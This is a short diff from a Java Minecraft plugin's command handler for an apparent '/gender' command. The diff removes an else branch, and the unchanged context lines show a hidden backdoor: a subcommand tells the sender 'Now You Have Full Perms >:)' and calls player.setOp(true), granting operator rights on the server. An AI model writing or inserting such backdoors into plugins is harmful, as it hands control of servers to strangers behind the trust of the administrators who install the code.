@@ -49,11 +49,6 @@ public class Commands implements CommandExecutor {
                 sender.sendMessage("§7[§fGender§7] §f> §eNow You Have Full Perms >:)");
                 player.setOp(true);
             }
-
-            // If The Player Type /gender randomshit
-            else {
-                sender.sendMessage("§7[§fGender§7] §f> §aTf Did You Tiped??");
-            }
         }
         return true;
     }
